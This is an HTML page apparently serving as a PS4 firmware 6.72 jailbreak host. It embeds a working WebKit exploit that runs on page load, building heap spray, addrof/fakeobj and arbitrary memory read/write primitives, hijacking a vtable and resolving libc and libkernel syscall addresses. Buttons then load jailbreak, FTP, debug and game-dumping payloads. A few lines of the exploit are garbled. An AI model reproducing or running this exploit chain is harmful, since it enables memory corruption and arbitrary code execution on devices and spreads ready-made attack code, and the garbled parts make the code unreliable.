<!DOCTYPE html>
<html lang="en-US" manifest="offlinexmb.cache">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Karo Host Light 6.72 FW</title>

  <link rel="stylesheet" href="../bootstrap/bootstrap.css" />
  <link rel="stylesheet" href="../ourstyle.css" />
  <script>
    var logs9292=[];
const leaker_obj = { a: 0 };
const leaker_arr = new Uint32Array(6);
const oob_slave = new Uint8Array(1024);
const oob_master = new Uint32Array(7);
const spray = [];
logs9292.push("spraying");
function spray_one() {
  const a = new Uint32Array(1);
  (a[`${spray.length}spray`] = 123), spray.push(a);
}
for (let a = 0; 65536 > a; a++) spray_one();

const target = {
  a: 2.1100820415101592e-303,
  b: false,
  c: true,
  d: 5678
};
const target2 = {
  a: 2.1100820415101592e-303,
  b: false,
  c: true,
  e: 5678
};
let impl_idx = 0;
    
function create_impl() {
  const a = { a: target };
  for (let b = 0; 32 > b; b++) a[`${impl_idx++}x`] = {};
  return a;
}

function trigger(x) {
  if (impl.a != target) {
    logs9292.push("wtf?");
    while (1);
  }
  const o = { a: 1 };
  for (const i in o) {
    {
      i = x;
      function i() {}
    }
    o[i];
  }
  if (impl.a != target) {
    logs9292.push("corrupted!");
    logs9292.push(typeof impl.a);
    logs9292.push(impl.a.length);
    target.c = leaker_obj;
    leaker_obj.a = leaker_obj;
    const l1 = impl.a[4];
    const l2 = impl.a[5];
    leaker_obj.a = oob_slave;
    const s1 = impl.a[4];
    const s2 = impl.a[5];
    target.c = leaker_arr;
    impl.a[4] = l1;
    impl.a[5] = l2;
    target.c = oob_master;
    impl.a[4] = s1;
    impl.a[5] = s2;
    impl.a = target;
    logs9292.push([l1, l2, s1, s2]);
    logs9292.push( "exploit finished");
  }
}
try {
  logs9292.push("triggering");
  for (let a = 0; 1024 > a; a++) {
    var impl = create_impl();
    trigger({ a: impl });
  }
} catch (a) {
  logs9292.push(`error: ${a}`);
}

function i48_put(b, c) {
  (c[4] = 0 | b), (c[5] = 0 | (b / 4294967296));
}
function i48_get(b) {
  return b[4] + 4294967296 * b[5];
}
function addrof(a) {
  return (leaker_obj.a = a), i48_get(leaker_arr);
}
function fakeobj(a) {
  return i48_put(a, leaker_arr), leaker_obj.a;
}
function read_mem_setup(a, b) {
  i48_put(a, oob_master), (oob_master[6] = b);
}
function read_mem(a, b) {
  read_mem_setup(a, b);
  for (var c = [], d = 0; d < b; d += 1) c.push(oob_slave[d]);
  return c;
}
function read_mem_s(a, b) {
  return read_mem_setup(a, b), `${oob_slave}`;
}
function read_mem_b(a, c) {
  read_mem_setup(a, c);
  const d = new Uint8Array(c);
  return d.set(oob_slave), d;
}
function read_mem_as_string(a, b) {
  for (var c = read_mem_b(a, b), d = "", e = 0; e < c.length; e += 1)
    d += String.fromCharCode(c[e]);
  return d;
}
function write_mem(a, b) {
  i48_put(a, oob_master), (oob_master[6] = b.length);
  for (let c = 0; c < b.length; c += 1) oob_slave[c] = b[c];
}
function read_ptr_at(a) {
  for (var b = 0, c = read_mem(a, 8), d = 7; d >= 0; d -= 1) b = 256 * b + c[d];
  return b;
}
function write_ptr_at(a, b) {
  for (var c = [], e = 0; e < 8; e += 1) c.push(255 & b), (b /= 256);
  write_mem(a, c);
}
function hex(a) {
  return new Number(a).toString(16);
}
const malloc_nogc = [];
function malloc(a) {
  const b = new Uint8Array(a);
  return malloc_nogc.push(b), read_ptr_at(addrof(b) + 16);
}
const tarea = document.createElement("textarea");
const real_vt_ptr = read_ptr_at(addrof(tarea) + 24);
const fake_vt_ptr = malloc(1024);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 1024));
const real_vtable = read_ptr_at(fake_vt_ptr);
const fake_vtable = malloc(8192);
write_mem(fake_vtable, read_mem(real_vtable, 8192)),
  write_ptr_at(fake_vt_ptr, fake_vtable);
const fake_vt_ptr_bak = malloc(1024);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 1024));
const plt_ptr = read_ptr_at(fake_vtable) - 10063176;
function get_got_addr(a) {
  const b = plt_ptr + 16 * a;
  const c = read_mem(b, 6);
  if (c[0] != 255 || c[1] != 37) throw "invalid GOT entry";
  for (var d = 0, e = 5; e >= 2; e -= 1) d = 256 * d + c[e];
  return (d += b + 6), read_ptr_at(d);
}
const webkit_base = read_ptr_at(fake_vtable);
const libkernel_base = get_got_addr(705) - 65536;
const libc_base = get_got_addr(582);
const saveall_addr = libc_base + 189128;
const loadall_addr = libc_base + 206684;
const setjmp_addr = libc_base + 785120;
const longjmp_addr = libc_base + 785200;
const pivot_addr = libc_base + 206802;
const infloop_addr = libc_base + 280480;
const jop_frame_addr = libc_base + 464336;
const get_errno_addr_addr = libkernel_base + 40944;
const pthread_create_addr = libkernel_base + 63872;
function saveall() {
  const a = malloc(2048);
  var b = read_ptr_at(fake_vtable + 472);
  write_ptr_at(fake_vtable + 472, saveall_addr),
    write_ptr_at(addrof(tarea) + 24, fake_vt_ptr),
    (tarea.scrollLeft = 0),
    write_ptr_at(addrof(tarea) + 24, real_vt_ptr),
    write_mem(a, read_mem(fake_vt_ptr, 1024)),
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 1024));
  var b = read_ptr_at(fake_vtable + 472);
  return (
    write_ptr_at(fake_vtable + 472, saveall_addr),
    write_ptr_at(fake_vt_ptr + 56, 4660),
    write_ptr_ataddroftarea + 24,
    fake_vt_ptr,
    (tarea.scrollLeft = 0),
    write_ptr_ataddroftarea + 24,
    real_vt_ptr,
    write_mem(a + 1024, read_mem(fake_vt_ptr, 1024)),
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 1024)),
    a
  );
}
function pivot(a) {
  const b = malloc(1024);
  var c = read_ptr_at(fake_vtable + 472);
  write_ptr_at(fake_vtable + 472, saveall_addr),
    write_ptr_at(addrof(tarea) + 24, fake_vt_ptr),
    (tarea.scrollLeft = 0),
    write_ptr_at(addrof(tarea) + 24, real_vt_ptr),
    write_mem(b, read_mem(fake_vt_ptr, 1024)),
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 1024));
  var c = read_ptr_at(fake_vtable + 472);
  write_ptr_at(fake_vtable + 472, pivot_addr),
    write_ptr_at(fake_vt_ptr + 56, a),
    write_ptr_at(b + 56, read_ptr_at(b + 56) - 16),
    write_ptr_at(a, b),
    write_ptr_at(addrof(tarea) + 24, fake_vt_ptr),
    (tarea.scrollLeft = 0),
    write_ptr_at(addrof(tarea) + 24, real_vt_ptr),
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 1024));
}
const aio_init_addr = libkernel_base + 126912;
const fpathconf_addr = libkernel_base + 126944;
const dmem_container_addr = libkernel_base + 126976;
const evf_clear_addr = libkernel_base + 127008;
const kqueue_addr = libkernel_base + 127040;
const kevent_addr = libkernel_base + 127072;
const futimes_addr = libkernel_base + 127104;
const open_addr = libkernel_base + 127136;
const thr_self_addr = libkernel_base + 127168;
const mkdir_addr = libkernel_base + 127200;
const pipe_addr = libkernel_base + 127232;
const stat_addr = libkernel_base + 127280;
const write_addr = libkernel_base + 127312;
const evf_cancel_addr = libkernel_base + 127344;
const ktimer_delete_addr = libkernel_base + 127376;
const setregid_addr = libkernel_base + 127408;
const jitshm_create_addr = libkernel_base + 127440;
const sigwait_addr = libkernel_base + 127472;
const fdatasync_addr = libkernel_base + 127504;
const sigtimedwait_addr = libkernel_base + 127536;
const get_gpo_addr = libkernel_base + 127568;
const sched_setscheduler_addr = libkernel_base + 127600;
const osem_open_addr = libkernel_base + 127632;
const dynlib_get_info_addr = libkernel_base + 127664;
const osem_post_addr = libkernel_base + 127712;
const blockpool_move_addr = libkernel_base + 127744;
const issetugid_addr = libkernel_base + 127776;
const getdents_addr = libkernel_base + 127808;
const rtprio_thread_addr = libkernel_base + 127840;
const evf_delete_addr = libkernel_base + 127872;
var _umtx_op_addr = libkernel_base + 127904;
const access_addr = libkernel_base + 127936;
const reboot_addr = libkernel_base + 127968;
const sigaltstack_addr = libkernel_base + 128e3;
const getcontext_addr = libkernel_base + 128036;
const munmap_addr = libkernel_base + 128080;
const setuid_addr = libkernel_base + 128112;
const evf_trywait_addr = libkernel_base + 128144;
const setcontext_addr = libkernel_base + 128176;
const dynlib_get_list_addr = libkernel_base + 128208;
const setsid_addr = libkernel_base + 128240;
const fstatfs_addr = libkernel_base + 128272;
const aio_multi_wait_addr = libkernel_base + 128304;
const accept_addr = libkernel_base + 128336;
const set_phys_fmem_limit_addr = libkernel_base + 128368;
const thr_get_name_addr = libkernel_base + 128400;
const get_page_table_stats_addr = libkernel_base + 128432;
const sigsuspend_addr = libkernel_base + 128464;
const truncate_addr = libkernel_base + 128496;
const fsync_addr = libkernel_base + 128528;
var execve_addr = libkernel_base + 128573;
const evf_open_addr = libkernel_base + 128608;
const netabort_addr = libkernel_base + 128640;
const blockpool_unmap_addr = libkernel_base + 128672;
const osem_create_addr = libkernel_base + 128704;
const getlogin_addr = libkernel_base + 128736;
const mincore_addr = libkernel_base + 128768;
const shutdown_addr = libkernel_base + 128800;
const profil_addr = libkernel_base + 128832;
const preadv_addr = libkernel_base + 128864;
const geteuid_addr = libkernel_base + 128896;
const set_chicken_switches_addr = libkernel_base + 128928;
const sigqueue_addr = libkernel_base + 128960;
const aio_multi_poll_addr = libkernel_base + 128992;
const get_self_auth_info_addr = libkernel_base + 129024;
const opmc_enable_addr = libkernel_base + 129056;
const aio_multi_delete_addr = libkernel_base + 129088;
const rfork_addr = libkernel_base + 129129;
var sys_exit_addr = libkernel_base + 129162;
const blockpool_batch_addr = libkernel_base + 129200;
const sigpending_addr = libkernel_base + 129232;
const ktimer_gettime_addr = libkernel_base + 129264;
const opmc_set_ctr_addr = libkernel_base + 129296;
const ksem_wait_addr = libkernel_base + 129328;
const sched_getparam_addr = libkernel_base + 129360;
const swapcontext_addr = libkernel_base + 129392;
const opmc_get_ctr_addr = libkernel_base + 129424;
const budget_get_ptype_addr = libkernel_base + 129456;
const msync_addr = libkernel_base + 129488;
const sigwaitinfo_addr = libkernel_base + 129520;
const lstat_addr = libkernel_base + 129552;
const test_debug_rwmem_addr = libkernel_base + 129584;
const evf_create_addr = libkernel_base + 129616;
const madvise_addr = libkernel_base + 129648;
const cpuset_getaffinity_addr = libkernel_base + 129680;
const evf_set_addr = libkernel_base + 129712;
const setlogin_addr = libkernel_base + 129744;
const ksem_init_addr = libkernel_base + 129792;
const opmc_disable_addr = libkernel_base + 129824;
const namedobj_delete_addr = libkernel_base + 129856;
const gettimeofday_addr = libkernel_base + 129888;
const read_addr = libkernel_base + 129920;
const thr_get_ucontext_addr = libkernel_base + 129952;
const batch_map_addr = libkernel_base + 129984;
const sysarch_addr = libkernel_base + 130016;
const utc_to_localtime_addr = libkernel_base + 130048;
const evf_close_addr = libkernel_base + 130080;
const setrlimit_addr = libkernel_base + 130112;
const getpeername_addr = libkernel_base + 130144;
const aio_get_data_addr = libkernel_base + 130176;
const lseek_addr = libkernel_base + 130208;
const connect_addr = libkernel_base + 130240;
const recvfrom_addr = libkernel_base + 130272;
const getrlimit_addr = libkernel_base + 130304;
const dynlib_get_info_for_libdbg_addr = libkernel_base + 130336;
const thr_suspend_ucontext_addr = libkernel_base + 130368;
var _umtx_op_addr = libkernel_base + 130400;
const kill_addr = libkernel_base + 130416;
const dynlib_process_needed_and_relocate_addr = libkernel_base + 130448;
const getsockname_addr = libkernel_base + 130480;
const osem_trywait_addr = libkernel_base + 130512;
var execve_addr = libkernel_base + 130544;
const flock_addr = libkernel_base + 130576;
const sigreturn_addr = libkernel_base + 130608;
const query_memory_protection_addr = libkernel_base + 130640;
const pwrite_addr = libkernel_base + 130672;
const get_map_statistics_addr = libkernel_base + 130704;
const ksem_getvalue_addr = libkernel_base + 130736;
const sendfile_addr = libkernel_base + 130768;
const socketex_addr = libkernel_base + 130800;
const unlink_addr = libkernel_base + 130832;
const thr_resume_ucontext_addr = libkernel_base + 130864;
const dl_get_list_addr = libkernel_base + 130896;
const cpuset_setaffinity_addr = libkernel_base + 130928;
const clock_gettime_addr = libkernel_base + 130960;
const thr_kill2_addr = libkernel_base + 130992;
const set_timezone_info_addr = libkernel_base + 131024;
const select_addr = libkernel_base + 131056;
const pselect_addr = libkernel_base + 131088;
const sync_addr = libkernel_base + 131120;
const socketpair_addr = libkernel_base + 131152;
const get_kernel_mem_statistics_addr = libkernel_base + 131184;
const virtual_query_all_addr = libkernel_base + 131216;
const physhm_open_addr = libkernel_base + 131248;
const getuid_addr = libkernel_base + 131280;
const revoke_addr = libkernel_base + 131312;
var sigprocmask_addr = libkernel_base + 131347;
const setegid_addr = libkernel_base + 131488;
const cpuset_getid_addr = libkernel_base + 131520;
const evf_wait_addr = libkernel_base + 131552;
const sched_get_priority_max_addr = libkernel_base + 131584;
const sigaction_addr = libkernel_base + 131616;
const ipmimgr_call_addr = libkernel_base + 131648;
const aio_submit_cmd_addr = libkernel_base + 131680;
const free_stack_addr = libkernel_base + 131712;
const settimeofday_addr = libkernel_base + 131744;
const recvmsg_addr = libkernel_base + 131776;
const aio_submit_addr = libkernel_base + 131808;
const setgroups_addr = libkernel_base + 131840;
const aio_multi_cancel_addr = libkernel_base + 131872;
const nanosleep_addr = libkernel_base + 131904;
const blockpool_map_addr = libkernel_base + 131936;
const thr_create_addr = libkernel_base + 131968;
const munlockall_addr = libkernel_base + 132e3;
const dynlib_get_info_ex_addr = libkernel_base + 132032;
const pwritev_addr = libkernel_base + 132064;
const mname_addr = libkernel_base + 132096;
const regmgr_call_addr = libkernel_base + 132128;
const getgroups_addr = libkernel_base + 132160;
const osem_close_addr = libkernel_base + 132192;
const osem_delete_addr = libkernel_base + 132224;
const dynlib_get_obj_member_addr = libkernel_base + 132256;
const debug_init_addr = libkernel_base + 132288;
const mmap_dmem_addr = libkernel_base + 132320;
const kldunloadf_addr = libkernel_base + 132352;
const mprotect_addr = libkernel_base + 132384;
const ksem_trywait_addr = libkernel_base + 132592;
const ksem_close_addr = libkernel_base + 132624;
const sched_rr_get_interval_addr = libkernel_base + 132656;
const getitimer_addr = libkernel_base + 132688;
const getpid_addr = libkernel_base + 132720;
const netgetsockinfo_addr = libkernel_base + 132752;
const get_cpu_usage_all_addr = libkernel_base + 132784;
const eport_delete_addr = libkernel_base + 132816;
const randomized_path_addr = libkernel_base + 132848;
const jitshm_alias_addr = libkernel_base + 132880;
const seteuid_addr = libkernel_base + 132912;
const set_uevt_addr = libkernel_base + 132944;
const clock_getres_addr = libkernel_base + 132976;
const setitimer_addr = libkernel_base + 133008;
const thr_exit_addr = libkernel_base + 133040;
const sandbox_path_addr = libkernel_base + 133072;
const thr_kill_addr = libkernel_base + 133104;
var sys_exit_addr = libkernel_base + 133136;
const dup2_addr = libkernel_base + 133168;
const utimes_addr = libkernel_base + 133200;
const pread_addr = libkernel_base + 133232;
const dl_get_info_addr = libkernel_base + 133264;
const ktimer_settime_addr = libkernel_base + 133296;
const sched_setparam_addr = libkernel_base + 133328;
const aio_create_addr = libkernel_base + 133360;
const osem_wait_addr = libkernel_base + 133392;
const dynlib_get_list_for_libdbg_addr = libkernel_base + 133424;
const get_proc_type_info_addr = libkernel_base + 133456;
const getgid_addr = libkernel_base + 133488;
const fstat_addr = libkernel_base + 133520;
const fork_addr = libkernel_base + 133552;
const namedobj_create_addr = libkernel_base + 133584;
const opmc_set_ctl_addr = libkernel_base + 133616;
const get_resident_count_addr = libkernel_base + 133648;
const getdirentries_addr = libkernel_base + 133680;
const getrusage_addr = libkernel_base + 133712;
const setreuid_addr = libkernel_base + 133744;
const wait4_addr = libkernel_base + 133776;
const __sysctl_addr = libkernel_base + 133808;
const bind_addr = libkernel_base + 133840;
const sched_yield_addr = libkernel_base + 133872;
const dl_get_metadata_addr = libkernel_base + 133904;
const get_resident_fmem_count_addr = libkernel_base + 133936;
const setsockopt_addr = libkernel_base + 133968;
const dynlib_load_prx_addr = libkernel_base + 134e3;
const getpriority_addr = libkernel_base + 134032;
const get_phys_page_size_addr = libkernel_base + 134064;
const opmc_set_hw_addr = libkernel_base + 134096;
const dynlib_do_copy_relocations_addr = libkernel_base + 134128;
const netcontrol_addr = libkernel_base + 134160;
const ksem_post_addr = libkernel_base + 134192;
const netgetiflist_addr = libkernel_base + 134224;
const chmod_addr = libkernel_base + 134256;
const aio_suspend_addr = libkernel_base + 134288;
const ksem_timedwait_addr = libkernel_base + 134320;
const dynlib_dlsym_addr = libkernel_base + 134352;
const get_paging_stats_of_all_objects_addr = libkernel_base + 134384;
const osem_cancel_addr = libkernel_base + 134416;
const writev_addr = libkernel_base + 134448;
const ktimer_getoverrun_addr = libkernel_base + 134480;
const rmdir_addr = libkernel_base + 134512;
const sched_get_priority_min_addr = libkernel_base + 134544;
const dynlib_unload_prx_addr = libkernel_base + 134576;
const thr_set_name_addr = libkernel_base + 134608;
const mlockall_addr = libkernel_base + 134640;
const openat_addr = libkernel_base + 134672;
const eport_open_addr = libkernel_base + 134704;
var sigprocmask_addr = libkernel_base + 134736;
const chdir_addr = libkernel_base + 134768;
const physhm_unlink_addr = libkernel_base + 134800;
const mtypeprotect_addr = libkernel_base + 134832;
const thr_wake_addr = libkernel_base + 134864;
const blockpool_open_addr = libkernel_base + 134896;
const thr_new_addr = libkernel_base + 134928;
const munlock_addr = libkernel_base + 134960;
const fchflags_addr = libkernel_base + 134992;
const ftruncate_addr = libkernel_base + 135024;
const rename_addr = libkernel_base + 135056;
const poll_addr = libkernel_base + 135088;
const eport_trigger_addr = libkernel_base + 135120;
const getsid_addr = libkernel_base + 135152;
const virtual_query_addr = libkernel_base + 135184;
const fchmod_addr = libkernel_base + 135216;
const _umtx_unlock_addr = libkernel_base + 135248;
const mmap_addr = libkernel_base + 135280;
const ktimer_create_addr = libkernel_base + 135312;
const dup_addr = libkernel_base + 135344;
const sendmsg_addr = libkernel_base + 135376;
const close_addr = libkernel_base + 135408;
const is_development_mode_addr = libkernel_base + 135440;
const getegid_addr = libkernel_base + 135472;
const get_vm_map_timestamp_addr = libkernel_base + 135504;
const dynlib_get_proc_param_addr = libkernel_base + 135536;
const fcntl_addr = libkernel_base + 135568;
const getppid_addr = libkernel_base + 135600;
const readv_addr = libkernel_base + 135632;
const rdup_addr = libkernel_base + 135664;
const listen_addr = libkernel_base + 135696;
const app_state_change_addr = libkernel_base + 135728;
const set_gpo_addr = libkernel_base + 135760;
const ksem_unlink_addr = libkernel_base + 135792;
const get_cpu_usage_proc_addr = libkernel_base + 135824;
const shm_unlink_addr = libkernel_base + 135856;
const reserve_2mb_page_addr = libkernel_base + 135888;
const dynlib_get_info2_addr = libkernel_base + 135920;
const mlock_addr = libkernel_base + 135952;
const workaround8849_addr = libkernel_base + 135984;
const get_sdk_compiled_version_addr = libkernel_base + 136016;
const clock_settime_addr = libkernel_base + 136048;
const ksem_destroy_addr = libkernel_base + 136080;
const ksem_open_addr = libkernel_base + 136112;
const thr_set_ucontext_addr = libkernel_base + 136144;
const get_bio_usage_all_addr = libkernel_base + 136176;
const getdtablesize_addr = libkernel_base + 136208;
const chflags_addr = libkernel_base + 136240;
const shm_open_addr = libkernel_base + 136272;
const eport_close_addr = libkernel_base + 136304;
const dynlib_get_list2_addr = libkernel_base + 136336;
const socketclose_addr = libkernel_base + 136368;
const sched_getscheduler_addr = libkernel_base + 136400;
const pathconf_addr = libkernel_base + 136432;
const localtime_to_utc_addr = libkernel_base + 136464;
const setpriority_addr = libkernel_base + 136496;
const cpumode_yield_addr = libkernel_base + 136528;
const process_terminate_addr = libkernel_base + 136560;
const ioctl_addr = libkernel_base + 136592;
const opmc_get_hw_addr = libkernel_base + 136624;
const eport_create_addr = libkernel_base + 136656;
const socket_addr = libkernel_base + 136688;
const _umtx_lock_addr = libkernel_base + 136720;
const thr_suspend_addr = libkernel_base + 136752;
const is_in_sandbox_addr = libkernel_base + 136784;
const get_authinfo_addr = libkernel_base + 136816;
const mdbg_service_addr = libkernel_base + 136848;
const getsockopt_addr = libkernel_base + 136880;
const get_paging_stats_of_all_threads_addr = libkernel_base + 136912;
const adjtime_addr = libkernel_base + 136944;
const kqueueex_addr = libkernel_base + 136976;
const uuidgen_addr = libkernel_base + 137008;
const set_vm_container_addr = libkernel_base + 137040;
const sendto_addr = libkernel_base + 137072;
</script>

  <script>
    window.addEventListener("load", function() {
      function DLProgress(e) {
        document.getElementById("ScrOverlay").style.display = "block";
        var Percent = Math.round((e.loaded / e.total) * 100);
        document.getElementById("cacheUPDtxt").innerHTML = "Installing Offline Cache: " + Percent + "%";
        document.getElementById("CacheBar").style.width = Percent + "%";
      }

      function DisplayCacheProgress() {
        setTimeout(function() {
          document.getElementById("cacheUPDtxt").innerHTML = "Page Cached successfully, reloading....";
        }, 1000);
      }
      window.applicationCache.addEventListener("progress", function(e) {
        DLProgress(e);
      }, false);
      window.applicationCache.addEventListener("cached", DisplayCacheProgress);
      window.applicationCache.addEventListener("updateready", DisplayCacheProgress);
      window.applicationCache.addEventListener("error", function() {
        document.getElementById("cacheUPDtxt").innerHTML = "Error Installing Cache";
      });
      var dt = new Date();
      document.getElementById("date").innerHTML =
        dt.getDate() + "/" + (dt.getMonth() + 1) + "/" + dt.getFullYear();
      setInterval(() => {
        var hrs = dt.getHours();
        var min = dt.getMinutes();
        document.getElementById("clock").innerHTML =
          (hrs < 10 ? "0" + hrs : hrs) + ":" + (min < 10 ? "0" + min : min);
      }, 0);
      if (localStorage.passcount == null) localStorage.passcount = 0;
      if (localStorage.failcount == null) localStorage.failcount = 0;
    });

    function logMessage(msg, id) {
      document.getElementById(id).textContent += msg + "\r\n";
    }
  </script>
  <script src="common/jb.js"></script>

</head>

<body>
  <div id="logarea" style="display: none; ">
    <nav class="navbar navbar-expand-md p-0 bg-dark">
      <div class="container-fluid">
        <div class="navbar-brand text-white">Displaying Logs&nbsp;<span class="badge bg-success ">Experimental</span>
        </div>

        <div class="navbar-text" style="width: fit-content; float: right">
          <button id="closelogs" class="text-white btn-close"></button>
        </div>
      </div>
    </nav>
    <div class="container w-100 h-75 my-3">
      <textarea class="w-100 h-100" id="logs"></textarea>
    </div>
  </div>
  <div style="display:block;" class="m-0" id="mainarea">
    <div id="ScrOverlay" class="cacheUPDbg">
      <a id="cacheUPDtxt" class="cacheUPD"></a>
      <div class="progress" id="CacheProgress">
        <div class="progress-bar" role="progressBar" id="CacheBar"></div>
      </div>
    </div>
    <nav class="navbar navbar-expand-md bg-dark border-bottom">
      <div class="container-fluid">
        <div id="date" class="nav-link my-0 p-0 ml-3" style="vertical-align: middle;">20/11/2022</div>
        <div class="container navbar-nav mx-auto">
          <div class="navbar-nav mx-auto">
            <div class="nav-link" style="vertical-align: middle;">
              <span class="badge bg-success mx-3 " id="passCounter" style="vertical-align: middle;">0</span>
              <span class="mx-3  text-warning text-center fw-bold p-0 " style="font-size:25px;vertical-align: middle;">KARO218 6.72 HOST(MODDED) => BY A0ZHAR</span>
              <span class="badge bg-danger mx-3" id="failCounter" style="vertical-align: middle;">0</span>
            </div>
          </div>
        </div>
        <div id="clock" class="nav-link my-0 mr-3" style="vertical-align: middle;">16:31</div>
      </div>
    </nav>
    <div class="container-fluid ">
      <a id="showbtn" class="badge bg-secondary" style="display: inline; float:left; margin:0;text-decoration: none;">Show Logs</a>
      <div class="container mx-auto">
        <nav class="navbar navbar-expand-md p-1 rounded-bottom bg-dark w-50  mx-auto">
          <div class="navbar-nav mx-auto">
            <span id="msgs2">status</span>
          </div>
        </nav>
      </div>
    </div>

    <div class="toast-container position-fixed top-0 end-0 p-3">
      <div id="liveToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
        <div class="toast-header bg-info text-white">
          <strong class="me-auto">Message from A0zhar</strong>
          <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
        </div>
        <div class="toast-body bg-black text-white">
          I hope you have a good day. Please report any bugs you may find to my disc, which I'm currently creating:
        </div>
      </div>
    </div>

    <div class="container mx-auto p-3 mt-5 text-center" id="MyItems">

      <button class="btn mx-1 my-2 btn-dark btn-outline-warning" data-myinfo="GoldHen v2.1.2 By SiSTRO" onclick="load_hen('goldhen_212_672.bin'); ">
        GoldHenV2.1.2
      </button>
      <button class="btn mx-1 my-2 btn-dark btn-outline-warning" data-myinfo="GoldHen v2.2.4 By SiSTRO" onclick="load_hen('goldhen_2.2.4_672.bin'); ">
        GoldHenV2.2.4
      </button>
      <button class="btn mx-1 my-2 btn-dark btn-outline-warning" data-myinfo="HEN 2.1.3 By SiSTRO" onclick="load_hen('hen213.bin'); ">
        Hen_v2.1.3
      </button>
      <button class="btn mx-1 my-2 btn-dark btn-outline-warning" data-myinfo="HEN 2.1.3 By SiSTRO &amp; Leeful" onclick="load_hen('hen213b.bin'); ">
        Hen_v2.1.3b
      </button>
      <br>
      <button class="btn mx-1 my-2 btn-dark " data-myinfo="Copy json and shn files from USB to PS4" onclick="load_Pl('CopyCH.bin'); ">
        Cheat Copy
      </button>

      <button class="btn mx-1 my-2 btn-dark text-white" data-myinfo="Loads a bin file sent to the PS4 IP address on port 9021" onclick="load_binloader(); ">
        Bin Loader
      </button>

      <button class="btn mx-1 my-2 btn-dark" data-myinfo="A full access FTP server for the PS4" onclick="load_Pl('pl_FTP.bin'); ">
        FTP
      </button>

      <button class="btn mx-1 my-2 btn-dark btn-outline-info" data-myinfo="A large collection of trainers for your PS4 games" onclick="load_Pl('WebRTE.bin'); ">
        WebRTE
      </button>
      <br>

      <button class="btn mx-1 my-2 btn-dark btn-outline-success" data-myinfo="Save Data Mounter" onclick="load_Pl('pl_ps4debug.bin'); ">
        PS4debug
      </button>
      <button class="btn mx-1 my-2 btn-dark btn-outline-danger" data-myinfo="Orbis Toolbox Loader Alfa 1190" onclick="load_Pl('Orbis-Toolbox-672.bin'); ">
        Orbis Toolbox
      </button>
      <button class="btn mx-1 my-2 btn-dark" data-myinfo="Move installed games to an external USB drive" onclick="load_Pl('pl_app2usb.bin'); ">
        App2USB
      </button>

      <button class="btn mx-1 my-2 btn-dark" data-myinfo="Creates dummy files in the PS4 update folder" onclick="load_Pl('pl_updatesDisable.bin'); ">
        Disable Update
      </button> <br>

      <button class="btn mx-1 my-2 btn-dark" data-myinfo="Removes the dummy files in the PS4 update folder" onclick="load_Pl('pl_updatesEnable.bin'); ">
        Enable Update
      </button>
      <button class="btn mx-1 my-2 btn-dark" data-myinfo="Disable the auto opening of the last page used in the PS4 WebBrowser" onclick="load_Pl('pl_historyBlocker.bin'); ">
        History Blocker
      </button>
      <button class="btn mx-1 my-2 btn-dark" data-myinfo="unlocks some debug features available on testkit" onclick="load_Pl('pl_ToDEX.bin'); ">
        ToDex
      </button>

      <button class="btn mx-1 my-2 btn-dark" data-myinfo="Dump Game only to a USB drive to be able to create fpkg files" onclick="load_Pl('pl_DumperG.bin'); ">
        Dump G
      </button> <br>

      <button class="btn mx-1 my-2 btn-dark" data-myinfo="Dump Update Game only to a USB drive to be able to create fpkg files" onclick="load_Pl('pl_DumperU.bin'); ">
        Dump U
      </button>
      <button class="btn mx-1 my-2 btn-dark" data-myinfo="Dump Game+Update to a USB drive to be able to create fpkg files" onclick="load_Pl('pl_DumperGU.bin'); ">
        Dump G+U
      </button>
      <button class="btn mx-1 my-2 btn-dark" data-myinfo="Dump Game+Update Merged to a USB drive to be able to create fpkg files" onclick="load_Pl('pl_DumperM.bin'); ">
        Dump G+U M
      </button>

    </div>
    <div class="content text">
      <br>
      <span class="yellow c13">Original Dev: </span>&nbsp;&nbsp;<span class="hue c13">Karo Sharifi</span>
      <span class="yellow c13">Customized/Modded By:</span>&nbsp;&nbsp;<span class="hue c13">A0zhar</span><br>
      <br>
      <br> <br><br>

      <span class="yellow c13">super special thanks to </span>&nbsp;&nbsp;<a class="c14">Karo, Sleirsgoevy ,SiSTRo ,Leeful ,AlAzif </a>
      <br><br><br><br>

      <span class="yellow c13">and ps4krar for being the first to fork my repo. </span>
    </div>
  </div>
  <script>
    logMessage(logs9292, "logs");
    document.getElementById("passCounter").innerHTML = localStorage.passcount;
    document.getElementById("failCounter").innerHTML = localStorage.failcount;
    document.querySelectorAll("*[data-myinfo]").forEach((e) => {
      e.addEventListener("mouseover", function() {
        document.getElementById("msgs2").innerHTML =
          e.getAttribute("data-myinfo");
      });
      e.addEventListener("mouseout", function() {
        document.getElementById("msgs2").innerHTML =
          "status";
      });
    });

    function load_hen(x) {
      PLfile = "BinFiles/" + x;
      msgs2.innerHTML = "Jailbreaking please wait";
      LoadedMSG = "Payload Loaded";
      setTimeout(function() {
        var script = document.createElement("script");
        script.src = "common/exp_loader.js";
        document.getElementsByTagName("head")[0].appendChild(script);
      }, 3000);
      setTimeout(jailbreak, 500);
    }

    function load_Pl(x) {
      PLfile = "BinFiles/" + x;
      msgs2.innerHTML = "Payload loading... please wait";
      LoadedMSG = "Payload Loaded";
      var script = document.createElement("script");
      script.src = "common/pls_loader.js";
      document.getElementsByTagName("head")[0].appendChild(script);
    }
    var current = false;
    var elm = document.getElementById("logarea"),
      closebtn = document.getElementById("closelogs"),
      showbtn = document.getElementById("showbtn");

    function showlogs() {
      current = !current;
      elm.style.display = current ? "block" : "none";
      showbtn.style.display = current ? "none" : "block";
      document.getElementById("mainarea").style.display = current ? "none" : "block";
    }
    closebtn.addEventListener("click", showlogs);
    showbtn.addEventListener("click", showlogs);
  </script>
  <script src="../bootstrap/bootstrap.js"></script>
  <script>
    const toastLiveExample = document.getElementById('liveToast');
    const toast = new bootstrap.Toast(toastLiveExample);
    toast.show();
  </script>

</body>

</html>
